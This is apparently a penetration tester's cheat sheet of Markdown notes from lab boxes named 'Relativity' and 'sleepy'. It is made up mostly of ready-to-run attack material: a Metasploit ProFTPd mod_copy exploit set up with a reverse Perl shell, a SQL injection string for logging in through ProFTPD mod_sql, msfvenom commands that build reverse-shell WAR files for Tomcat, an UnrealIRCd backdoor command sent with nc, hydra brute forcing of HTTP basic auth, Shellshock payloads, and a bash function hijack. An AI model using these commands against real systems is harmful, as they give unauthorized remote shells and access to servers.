# ProFTPd

## ProFTPd 1.3.5, mod_copy
	Any Linux server running Proftp version < 1.3.5 are vulnerable.
	https://raw.githubusercontent.com/t0kx/exploit-CVE-2015-3306/master/exploit.py
	https://www.exploit-db.com/exploits/36742
	https://www.exploit-db.com/exploits/36803
	use exploit/unix/ftp/proftpd_modcopy_exec
	set RHOST 192.168.6.154
	set SITEPATH /var/www/html/test
	set TARGETURI /test/
	set PAYLOAD cmd/unix/reverse_perl
	set LHOST 192.168.6.138
	run

	id


## ProFTPD 1.2.8 - 1.2.9 mod_sql
	
Boxes : Relativity

	└─$ ftp 172.16.16.128
	Connected to 172.16.16.128.
	220 Welcome to Relativity FTP (mod_sql)
	Name (172.16.16.128:kali): %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # 
	331 Password required for %').
	Password:1  <== WHY ?
	230 User %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> ls 
	200 PORT command successful


# vsftpd

- The default location for pub ftp on CentOS : __/var/ftp/pub/__

# Tomcat

Boxes : sleepy

- Default : 
	1. _/etc/tomcat/tomcat-users.xml_
	2. _/etc/tomcat/server.xml_
- Shell
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=1234 -f war > shell.war
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war



# UnrealIRCd 3.2.8.1

Boxes : Relativity

	echo "AB;<command>" |nc <IRCd address> <port>

# HTTP auth basic

	# Brute force
	$ hydra -l admin  -p darkweb2017-top100.txt  a.b.c.d http-get


# Shellshock bash [v1.14 - v4.3 ]

Boxes : sleepy

	env var='() { ignore this;}; echo VULN' bash -c /bin/true  
	env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
	env X=' () { }; echo hello' bash -c 'date'
	shellshocker='() { echo You are vulnerable; }' bash -c shellshocker

	curl -A " () { :; }; echo VULN " {URL}
	telnet <serveur_internet_sous_notre_controle> 8888
	#
	bash-4.2$ function /usr/bin/sl () { /bin/bash; }
	bash-4.2$ export -f /usr/bin/sl

